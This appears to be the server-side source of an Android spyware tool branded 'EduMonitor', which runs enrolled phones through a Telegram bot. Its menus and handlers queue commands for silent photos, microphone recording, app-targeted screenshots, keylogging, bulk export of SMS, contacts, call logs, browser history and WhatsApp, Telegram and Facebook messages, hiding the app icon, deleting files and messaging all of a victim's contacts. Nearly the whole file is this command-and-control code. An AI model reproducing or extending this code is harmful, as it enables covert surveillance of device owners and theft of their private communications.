            `🔧 *Quick Commands:*\n` +
            `• /help - Show this menu\n` +
            `• /devices - List your registered devices\n` +
            `• /stats - View device statistics\n` +
            `• /select [id] - Select active device\n\n` +
            `💡 *Tips:*\n` +
            `• You can control multiple devices from one chat\n` +
            `• Use the inline buttons for easy navigation\n` +
            `• Commands are queued when device is offline\n\n` +
            `Click the buttons below to get started!`;
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            welcomeMessage,
            getMainMenuKeyboard(chatId)
        );
        return;
    }
    
    // Handle /help - Show help menu
    if (command === '/help') {
        console.log('📋 Showing help menu');
        
        const helpMessage = `🤖 *EduMonitor Bot Help*\n\n` +
            `*📱 Device Management*\n` +
            `• /devices - List all registered devices\n` +
            `• /stats - Show device statistics\n` +
            `• /select [device_id] - Select active device\n\n` +
            `*📸 Screenshot*\n` +
            `• /screenshot - Take screenshot\n` +
            `• /start_screenshot - Start auto-screenshot\n` +
            `• /stop_screenshot - Stop auto-screenshot\n\n` +
            `*📷 Camera*\n` +
            `• /photo - Take photo (with notification)\n` +
            `• /photo_silent - Take photo (silent)\n` +
            `• /photo_front - Front camera photo\n\n` +
            `*🎤 Recording*\n` +
            `• /record - Start 60s recording\n` +
            `• /stop_recording - Stop recording\n\n` +
            `*📊 Data*\n` +
            `• /contacts - Export contacts\n` +
            `• /sms - Export SMS\n` +
            `• /calllogs - Export call logs\n` +
            `• /location - Get device location\n\n` +
            `*ℹ️ Info*\n` +
            `• /device_info - Device information\n` +
            `• /network_info - Network information\n` +
            `• /mobile_info - Mobile/SIM information\n\n` +
            `Use the menu buttons below for quick access!`;
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            helpMessage,
            getMainMenuKeyboard(chatId)
        );
        return;
    }
    
    // Handle /showmenu - Show main menu
    if (command === '/showmenu') {
        console.log('📋 Showing main menu');
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 *EduMonitor Control Panel*\n\nSelect a category:",
            getMainMenuKeyboard(chatId)
        );
        return;
    }
    
    // Handle /stats - Show device statistics
    if (command === '/stats' || command === '/device_stats') {
        const stats = await getDeviceStats(chatId);
        const message = formatDeviceStatsMessage(stats);
        await sendTelegramMessage(chatId, message);
        return;
    }
    
    // Handle /devices - List all devices
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        
        if (userDevices.length === 0) {
            message += "No devices registered yet.\n\n";
            message += "Please install the Android app and grant permissions.\n";
            message += "The device will automatically register when you open the app.";
        } else {
            userDevices.forEach((device, index) => {
                const status = device.isActive ? '✅ ACTIVE' : '○';
                const onlineStatus = device.isOnline ? '🟢 Online' : '🔴 Offline';
                message += `${index + 1}. ${status} ${device.name}\n`;
                message += `   ID: \`${device.id}\`\n`;
                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
                message += `   Status: ${onlineStatus}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
            message += `\nUse /select [device_id] to switch active device.\n`;
            message += `Use /stats for detailed device statistics.`;
        }
        
        await sendTelegramMessage(chatId, message);
        return;
    }
    
    // Handle /select - Select active device
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        
        if (device && String(device.chatId) === String(chatId)) {
            userDeviceSelection.set(chatId, deviceId);
            await sendTelegramMessage(chatId, 
                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
                `ID: ${deviceId.substring(0, 8)}...\n\n` +
                `You can now send commands to this device.`);
        } else {
            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.\n\nUse /devices to see available devices.');
        }
        return;
    }
    
    // Handle /refresh - Refresh stats
    if (command === '/refresh' || command === '/refresh_stats') {
        const stats = await getDeviceStats(chatId);
        const message = formatDeviceStatsMessage(stats);
        await sendTelegramMessage(chatId, message);
        return;
    }
    
    // ============ COMMANDS THAT GO TO DEVICE ============
    
    // Get selected device
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
    
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                userDeviceSelection.set(chatId, selectedDeviceId);
                break;
            }
        }
    }
    
    if (!device) {
        await sendTelegramMessageWithKeyboard(chatId, 
            '❌ *No device registered!*\n\n' +
            'Please make sure:\n' +
            '1. The Android app is installed\n' +
            '2. All permissions are granted\n' +
            '3. The app has been opened at least once\n\n' +
            'The device will automatically register when you open the app.',
            getMainMenuKeyboard(chatId));
        return;
    }
    
    device.lastSeen = Date.now();
    await saveDevices();
    
    if (!device.pendingCommands) device.pendingCommands = [];
    
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    device.pendingCommands.push({
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    });
    await saveDevices();
    
    await sendTelegramMessage(chatId, `✅ *Command sent: ${command}*\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\nThe command will be executed when the device is online.`);
}


async function showDeviceMenu(chatId, messageId, deviceId) {
    const device = devices.get(deviceId);
    
    const keyboard = [
        [
            { text: "📱 Apps", callback_data: `cmd:apps_list:${deviceId}` },
            { text: "ℹ️ Device Info", callback_data: `cmd:device_info:${deviceId}` }
        ],
        [
            { text: "📁 Get File", callback_data: `cmd:get_file:${deviceId}` },
            { text: "🗑️ Delete File", callback_data: `cmd:delete_file:${deviceId}` }
        ],
        [
            { text: "📋 Clipboard", callback_data: `cmd:clipboard:${deviceId}` },
            { text: "🎤 Microphone", callback_data: `cmd:microphone:${deviceId}` }
        ],
        [
            { text: "📷 Main Camera", callback_data: `cmd:camera_main:${deviceId}` },
            { text: "🤳 Selfie Camera", callback_data: `cmd:camera_selfie:${deviceId}` }
        ],
        [
            { text: "📍 Location", callback_data: `cmd:location:${deviceId}` },
            { text: "🔔 Toast", callback_data: `cmd:toast:${deviceId}` }
        ],
        [
            { text: "📞 Calls", callback_data: `cmd:calls:${deviceId}` },
            { text: "📇 Contacts", callback_data: `cmd:contacts:${deviceId}` }
        ],
        [
            { text: "📳 Vibrate", callback_data: `cmd:vibrate:${deviceId}` },
            { text: "🔔 Show Notification", callback_data: `cmd:show_notification:${deviceId}` }
        ],
        [
            { text: "💬 Messages", callback_data: `cmd:messages:${deviceId}` },
            { text: "✏️ Send Message", callback_data: `cmd:send_message:${deviceId}` }
        ],
        [
            { text: "🔊 Play Audio", callback_data: `cmd:play_audio:${deviceId}` },
            { text: "🔇 Stop Audio", callback_data: `cmd:stop_audio:${deviceId}` }
        ],
        [
            { text: "📨 Send Message to All Contacts", callback_data: `cmd:send_message_to_all:${deviceId}` }
        ],
        [
            { text: "◀️ Back to Main Menu", callback_data: "help_main" }
        ]
    ];
    
    await editMessageKeyboard(chatId, messageId, keyboard);
    await sendTelegramMessage(chatId, `🎮 *Commands for:* ${device.deviceInfo?.model}\n\nSelect an option:`);
}
// ============= CALLBACK QUERY HANDLER =============
async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback: ${data} from ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    if (data.startsWith('show_device_menu:')) {
    const deviceId = data.split(':')[1];
    await showDeviceMenu(chatId, messageId, deviceId);
    return;
}
    // Handle command callbacks (cmd:something)
    if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        // These are device commands - send to device
        await handleCommand(chatId, `/${command}`, messageId);
        return;
    }
    
    // Handle menu navigation
    switch (data) {
        case 'help_main':
            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
            await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
            break;
            
        case 'menu_screenshot':
            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
            break;
            
        case 'menu_screenshot_settings':
            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
            break;
            
        case 'menu_screenshot_targets':
            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
            break;
            
        case 'menu_screenshot_quality':
            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
            break;
            
        case 'menu_screenshot_token':
            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
            break;
            
        case 'menu_sched_config':
            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
            break;
            
        case 'menu_configure_schedule':
            await sendTelegramMessage(chatId, "⚙️ *Configure Screenshot Schedule*\n\nSend: `on/off general_minutes target_minutes`\nExample: `on 10 5`");
            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
            userStates.set(chatId, { state: 'awaiting_sched_config' });
            break;
            
        case 'menu_add_target':
            await sendTelegramMessage(chatId, "📱 *Add Target App*\n\nSend the package name:\nExample: `com.whatsapp`");
            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
            userStates.set(chatId, { state: 'awaiting_add_target' });
            break;
            
        case 'menu_remove_target':
            await sendTelegramMessage(chatId, "❌ *Remove Target App*\n\nSend the package name to remove:");
            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
            userStates.set(chatId, { state: 'awaiting_remove_target' });
            break;
            
        case 'menu_camera':
            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
            break;
            
        case 'menu_recording':
            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
            break;
            
        case 'menu_recording_settings':
            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
            break;
            
        case 'menu_audio_quality':
            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
            break;
            
        case 'menu_custom_schedule':
            await sendTelegramMessage(chatId, "⚙️ *Set Custom Recording Schedule*\n\nFormat: `HH:MM HH:MM daily/once minutes`\nExample: `22:00 06:00 daily 30`");
            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
            userStates.set(chatId, { state: 'awaiting_custom_schedule' });
            break;
            
        case 'menu_data':
            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
            break;
            
        case 'menu_new_data':
            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
            break;
            
        case 'menu_all_data':
            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
            break;
            
        case 'menu_sync_harvest':
            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
            break;
            
        case 'menu_set_sync_interval':
            await sendTelegramMessage(chatId, "⚙️ *Set Sync Interval*\n\nSend interval in minutes (5-720):\nExample: `60`");
            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
            userStates.set(chatId, { state: 'awaiting_sync_interval' });
            break;
            
        case 'menu_realtime':
            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
            break;
            
        case 'menu_info':
            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
            break;
            
        case 'menu_device_name':
            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
            break;
            
        case 'menu_system':
            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
            break;
            
        case 'menu_media':
            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
            break;
            
        case 'menu_add_scan_path':
            await sendTelegramMessage(chatId, "📁 *Add Scan Path*\n\nSend the folder path to scan:\nExample: `DCIM/Camera`");
            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
            userStates.set(chatId, { state: 'awaiting_add_scan_path' });
            break;
            
        case 'menu_remove_scan_path':
            await sendTelegramMessage(chatId, "❌ *Remove Scan Path*\n\nSend the folder path to remove:");
            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
            userStates.set(chatId, { state: 'awaiting_remove_scan_path' });
            break;
            
        case 'menu_app_management':
            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
            break;
            
        case 'menu_data_saving':
            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
            break;
            
        case 'menu_bot_token':
            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
            break;
            
        case 'menu_set_server_backup':
            await sendTelegramMessage(chatId, "🤖 *Set Server Backup Tokens*\n\nFormat: `token1 chatId1 token2 chatId2`\nExample: `123456:ABC 123456789 654321:XYZ 987654321`");
            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
            userStates.set(chatId, { state: 'awaiting_server_backup' });
            break;
            
        case 'menu_devices':
            const keyboard = getDeviceSelectionKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, keyboard);
            break;
            
        case 'refresh_devices':
            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
            await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
            break;
            
        case 'device_stats':
            const stats = await getDeviceStats(chatId);
            const message = formatDeviceStatsMessage(stats);
            await sendTelegramMessage(chatId, message);
            break;
            
        case 'close_menu':
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, "Menu closed. Type /help to reopen.");
            break;
            
        default:
            if (data.startsWith('select_device:')) {
                const selectedDeviceId = data.split(':')[1];
                const device = devices.get(selectedDeviceId);
                if (device) {
                    userDeviceSelection.set(chatId, selectedDeviceId);
                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
                    await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
                } else {
                    await answerCallbackQuery(callbackId, '❌ Device not found');
                }
            } else {
                console.log(`⚠️ Unknown callback: ${data}`);
                await answerCallbackQuery(callbackId, '❌ Unknown option');
            }
            break;
    }
}



// ============= COMPLETE INLINE MENU KEYBOARDS =============

// Main Menu - Root level
function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ ${activeDevice.deviceInfo?.model || 'Device'}`;
    }
    
    return [
        [
            { text: "📸 Screenshot", callback_data: "menu_screenshot" },
            { text: "📷 Camera", callback_data: "menu_camera" }
        ],
        [
            { text: "🎤 Recording", callback_data: "menu_recording" },
            { text: "📍 Location", callback_data: "cmd:location" }
        ],
        [
            { text: "📊 Data", callback_data: "menu_data" },
            { text: "⚡ Real-time", callback_data: "menu_realtime" }
        ],
        [
            { text: "ℹ️ Info", callback_data: "menu_info" },
            { text: "⚙️ System", callback_data: "menu_system" }
        ],
        [
            { text: deviceStatus, callback_data: "menu_devices" },
            { text: "❌ Close", callback_data: "close_menu" }
        ]
    ];
}

// Screenshot Menu
function getScreenshotMenuKeyboard() {
    return [
        [
            { text: "📸 Take Screenshot", callback_data: "cmd:screenshot" },
            { text: "▶️ Start Service", callback_data: "cmd:start_screenshot" }
        ],
        [
            { text: "⏹️ Stop Service", callback_data: "cmd:stop_screenshot" },
            { text: "🔄 Restart", callback_data: "cmd:restart_screenshot" }
        ],
        [
            { text: "⚙️ Settings", callback_data: "menu_screenshot_settings" },
            { text: "🎯 Target Apps", callback_data: "menu_screenshot_targets" }
        ],
        [
            { text: "🎨 Quality", callback_data: "menu_screenshot_quality" },
            { text: "🔑 Token", callback_data: "menu_screenshot_token" }
        ],
        [
            { text: "🔧 Check Accessibility", callback_data: "cmd:check_accessibility" },
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Screenshot Settings Sub-menu
function getScreenshotSettingsKeyboard() {
    return [
        [
            { text: "📊 Status", callback_data: "cmd:screenshot_status" },
            { text: "⚙️ Config", callback_data: "menu_sched_config" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_screenshot" }
        ]
    ];
}

// Screenshot Target Apps Sub-menu
function getScreenshotTargetsKeyboard() {
    return [
        [
            { text: "➕ Add Target", callback_data: "menu_add_target" },
            { text: "❌ Remove Target", callback_data: "menu_remove_target" }
        ],
        [
            { text: "📱 List Targets", callback_data: "cmd:target_apps" },
            { text: "📋 Default Targets", callback_data: "cmd:default_targets" }
        ],
        [
            { text: "🔄 Reset Targets", callback_data: "cmd:reset_targets" },
            { text: "◀️ Back", callback_data: "menu_screenshot" }
        ]
    ];
}

// Screenshot Quality Sub-menu
function getScreenshotQualityKeyboard() {
    return [
        [
            { text: "📏 Small (640x480, 60%)", callback_data: "cmd:small" }
        ],
        [
            { text: "📏 Medium (1280x720, 70%)", callback_data: "cmd:medium" }
        ],
        [
            { text: "📏 Original (Full res, 85%)", callback_data: "cmd:original" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_screenshot" }
        ]
    ];
}

// Screenshot Token Sub-menu
function getScreenshotTokenKeyboard() {
    return [
        [
            { text: "🔄 Refresh Token", callback_data: "cmd:refresh_token" },
            { text: "🔑 Token Status", callback_data: "cmd:token_status" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_screenshot" }
        ]
    ];
}

// Schedule Config Sub-menu
function getSchedConfigKeyboard() {
    return [
        [
            { text: "📅 Configure Schedule", callback_data: "menu_configure_schedule" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_screenshot_settings" }
        ]
    ];
}

// Camera Menu
function getCameraMenuKeyboard() {
    return [
        [
            { text: "📸 Take Photo", callback_data: "cmd:photo" },
            { text: "🔇 Silent Photo", callback_data: "cmd:photo_silent" }
        ],
        [
            { text: "👤 Front Camera", callback_data: "cmd:camera_front" },
            { text: "👥 Back Camera", callback_data: "cmd:camera_back" }
        ],
        [
            { text: "🔄 Switch Camera", callback_data: "cmd:camera_switch" },
            { text: "👤 Front Silent", callback_data: "cmd:photo_front" }
        ],
        [
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Recording Menu
function getRecordingMenuKeyboard() {
    return [
        [
            { text: "🎤 Start 60s", callback_data: "cmd:start_60s_rec" },
            { text: "⏹️ Stop", callback_data: "cmd:stop_60s_rec" }
        ],
        [
            { text: "⚙️ Settings", callback_data: "menu_recording_settings" },
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Recording Settings Sub-menu
function getRecordingSettingsKeyboard() {
    return [
        [
            { text: "📊 Info", callback_data: "cmd:record_info" },
            { text: "✅ Enable Schedule", callback_data: "cmd:record_on" }
        ],
        [
            { text: "❌ Disable Schedule", callback_data: "cmd:record_off" },
            { text: "⚙️ Custom Schedule", callback_data: "menu_custom_schedule" }
        ],
        [
            { text: "🎚️ Audio Quality", callback_data: "menu_audio_quality" },
            { text: "◀️ Back", callback_data: "menu_recording" }
        ]
    ];
}

// Audio Quality Sub-menu
function getAudioQualityKeyboard() {
    return [
        [
            { text: "🎤 Ultra Low", callback_data: "cmd:audio_ultra" },
            { text: "🎤 Very Low", callback_data: "cmd:audio_very_low" }
        ],
        [
            { text: "🎤 Low", callback_data: "cmd:audio_low" },
            { text: "🎤 Medium", callback_data: "cmd:audio_medium" }
        ],
        [
            { text: "🎤 High", callback_data: "cmd:audio_high" },
            { text: "◀️ Back", callback_data: "menu_recording_settings" }
        ]
    ];
}

// Data Menu
function getDataMenuKeyboard() {
    return [
        [
            { text: "📊 NEW Data", callback_data: "menu_new_data" },
            { text: "📊 ALL Data", callback_data: "menu_all_data" }
        ],
        [
            { text: "🔄 Sync & Harvest", callback_data: "menu_sync_harvest" },
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// New Data Sub-menu (only unsynced data)
function getNewDataKeyboard() {
    return [
        [
            { text: "📇 Contacts", callback_data: "cmd:contacts" },
            { text: "💬 SMS", callback_data: "cmd:sms" }
        ],
        [
            { text: "📞 Call Logs", callback_data: "cmd:calllogs" },
            { text: "📱 Apps", callback_data: "cmd:apps_list" }
        ],
        [
            { text: "⌨️ Keystrokes", callback_data: "cmd:keys" },
            { text: "🔔 Notifications", callback_data: "cmd:notify" }
        ],
        [
            { text: "📱 App Opens", callback_data: "cmd:open_app" },
            { text: "💬 WhatsApp", callback_data: "cmd:whatsapp" }
        ],
        [
            { text: "💬 Telegram", callback_data: "cmd:telegram" },
            { text: "💬 Facebook", callback_data: "cmd:facebook" }
        ],
        [
            { text: "🌐 Browser", callback_data: "cmd:browser" },
            { text: "◀️ Back", callback_data: "menu_data" }
        ]
    ];
}

// ALL Data Sub-menu (all data from database)
function getAllDataKeyboard() {
    return [
        [
            { text: "📇 ALL Contacts", callback_data: "cmd:contacts_all" },
            { text: "💬 ALL SMS", callback_data: "cmd:sms_all" }
        ],
        [
            { text: "📞 ALL Call Logs", callback_data: "cmd:calllogs_all" },
            { text: "📱 ALL Apps", callback_data: "cmd:apps_all" }
        ],
        [
            { text: "⌨️ ALL Keystrokes", callback_data: "cmd:keys_all" },
            { text: "🔔 ALL Notifications", callback_data: "cmd:notify_all" }
        ],
        [
            { text: "💬 ALL WhatsApp", callback_data: "cmd:whatsapp_all" },
            { text: "💬 ALL Telegram", callback_data: "cmd:telegram_all" }
        ],
        [
            { text: "💬 ALL Facebook", callback_data: "cmd:facebook_all" },
            { text: "🌐 ALL Browser", callback_data: "cmd:browser_all" }
        ],
        [
            { text: "📍 Location", callback_data: "cmd:location" },
            { text: "🔍 Find Recorded", callback_data: "cmd:find_recorded" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_data" }
        ]
    ];
}

// Sync & Harvest Sub-menu
function getSyncHarvestKeyboard() {
    return [
        [
            { text: "🔄 Sync All", callback_data: "cmd:sync_all" },
            { text: "⚡ Force Harvest", callback_data: "cmd:force_harvest" }
        ],
        [
            { text: "📊 Stats", callback_data: "cmd:stats" },
            { text: "📊 Logs Count", callback_data: "cmd:logs_count" }
        ],
        [
            { text: "🗑️ Clear Logs", callback_data: "cmd:clear_logs" },
            { text: "⚙️ Set Sync Interval", callback_data: "menu_set_sync_interval" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_data" }
        ]
    ];
}

// Real-time Menu
function getRealtimeMenuKeyboard() {
    return [
        [
            { text: "🔑 Keys ON", callback_data: "cmd:rt_keys_on" },
            { text: "🔑 Keys OFF", callback_data: "cmd:rt_keys_off" }
        ],
        [
            { text: "🔔 Notif ON", callback_data: "cmd:rt_notif_on" },
            { text: "🔔 Notif OFF", callback_data: "cmd:rt_notif_off" }
        ],
        [
            { text: "✅ All ON", callback_data: "cmd:rt_all_on" },
            { text: "❌ All OFF", callback_data: "cmd:rt_all_off" }
        ],
        [
            { text: "📊 Status", callback_data: "cmd:rt_status" },
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Info Menu
function getInfoMenuKeyboard() {
    return [
        [
            { text: "📱 Device Info", callback_data: "cmd:device_info" }
        ],
        [
            { text: "🌐 Network Info", callback_data: "cmd:network_info" }
        ],
        [
            { text: "📱 Mobile Info", callback_data: "cmd:mobile_info" }
        ],
        [
            { text: "🏷️ Device Name", callback_data: "menu_device_name" }
        ],
        [
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Device Name Sub-menu
function getDeviceNameKeyboard() {
    return [
        [
            { text: "📱 Show Name", callback_data: "cmd:device_name" },
            { text: "🔄 Reset Name", callback_data: "cmd:reset_device_name" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_info" }
        ]
    ];
}

// System Menu
function getSystemMenuKeyboard() {
    return [
        [
            { text: "📁 Media", callback_data: "menu_media" },
            { text: "📱 App Management", callback_data: "menu_app_management" }
        ],
        [
            { text: "📡 Data Saving", callback_data: "menu_data_saving" },
            { text: "🤖 Bot Token", callback_data: "menu_bot_token" }
        ],
        [
            { text: "◀️ Back", callback_data: "help_main" }
        ]
    ];
}

// Media Management Sub-menu
function getMediaMenuKeyboard() {
    return [
        [
            { text: "🔍 Find Recorded", callback_data: "cmd:find_recorded" },
            { text: "🗑️ Clear Storage", callback_data: "cmd:clear_storage" }
        ],
        [
            { text: "✅ Enable Media Scan", callback_data: "cmd:enable_media_scan" },
            { text: "❌ Disable Media Scan", callback_data: "cmd:disable_media_scan" }
        ],
        [
            { text: "📊 Scan Status", callback_data: "cmd:media_scan_status" },
            { text: "➕ Add Scan Path", callback_data: "menu_add_scan_path" }
        ],
        [
            { text: "❌ Remove Scan Path", callback_data: "menu_remove_scan_path" },
            { text: "📋 List Paths", callback_data: "cmd:list_scan_paths" }
        ],
        [
            { text: "🗑️ Clear Paths", callback_data: "cmd:clear_scan_paths" },
            { text: "◀️ Back", callback_data: "menu_system" }
        ]
    ];
}

// App Management Sub-menu
function getAppManagementKeyboard() {
    return [
        [
            { text: "🔄 Reboot Services", callback_data: "cmd:reboot_app" },
            { text: "👻 Hide Icon", callback_data: "cmd:hide_icon" }
        ],
        [
            { text: "👁️ Show Icon", callback_data: "cmd:show_icon" },
            { text: "📁 Browse Files", callback_data: "cmd:browse_files" }
        ],
        [
            { text: "◀️ Back", callback_data: "menu_system" }
        ]
    ];
}

// Data Saving Sub-menu
function getDataSavingKeyboard() {
    return [
        [
            { text: "📡 WiFi-Only ON", callback_data: "cmd:wifi_only_on" },
            { text: "📡 WiFi-Only OFF", callback_data: "cmd:wifi_only_off" }
        ],
        [
            { text: "📊 Saving Status", callback_data: "cmd:saving_status" },
            { text: "◀️ Back", callback_data: "menu_system" }
        ]
    ];
}

// Bot Token Sub-menu
function getBotTokenKeyboard() {
    return [
        [
            { text: "🤖 Backup Status", callback_data: "cmd:backup_status" },
            { text: "🔄 Set Server Backup", callback_data: "menu_set_server_backup" }
        ],
        [
            { text: "🔄 Force Register", callback_data: "cmd:force_register_complete" },
            { text: "◀️ Back", callback_data: "menu_system" }
        ]
    ];
}

// Devices Menu - Dynamic (shows actual devices)
function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const onlineStatus = device.isOnline ? '🟢' : '🔴';
        keyboard.push([{
            text: `${status}${onlineStatus} ${device.name}`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([
        { text: "🔄 Refresh List", callback_data: "refresh_devices" },
        { text: "📊 Device Stats", callback_data: "device_stats" }
    ]);
    keyboard.push([
        { text: "◀️ Back to Main Menu", callback_data: "help_main" }
    ]);
    
    return keyboard;
}

// Input prompt menus (for user input)
function getAddTargetKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_targets" }]]; 
}

function getRemoveTargetKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_targets" }]]; 
}

function getAddScanPathKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_media" }]]; 
}

function getRemoveScanPathKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_media" }]]; 
}

function getConfigureScheduleKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_screenshot_settings" }]]; 
}

function getCustomScheduleKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_recording_settings" }]]; 
}

function getSetSyncIntervalKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_sync_harvest" }]]; 
}

function getSetServerBackupKeyboard() { 
    return [[{ text: "◀️ Cancel", callback_data: "menu_bot_token" }]]; 
}
// ============= START SERVER =============
async function startServer() {
    console.log('🚀 Starting EduMonitor Server...');
    
    // Load existing devices from storage
    if (octokit && GIST_ID) {
        const devicesData = await readFromGist(GIST_FILES.DEVICES);
        if (devicesData) {
            for (const [id, device] of Object.entries(devicesData)) devices.set(id, device);
            console.log(`✅ Loaded ${devices.size} devices from Gist`);
        }
    }
    
    // Load failover state
    await loadFailoverState();
    
    app.listen(PORT, '0.0.0.0', async () => {
        console.log(`\n🚀 Server running on port ${PORT}`);
        console.log(`📍 Server URL: ${activeServerUrl}`);
        console.log(`📱 Devices registered: ${devices.size}`);
        console.log(`👥 Authorized chats: ${authorizedChats.size}`);
        console.log(`🔐 Encryption salt: ${ENCRYPTION_SALT.substring(0, 10)}...`);
        console.log(`🔄 Failover active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
        console.log(`📊 Auto-data queue: ${autoDataRequested.size} devices`);
        
        await setupWebhook();
    });
}

startServer().catch(console.error);
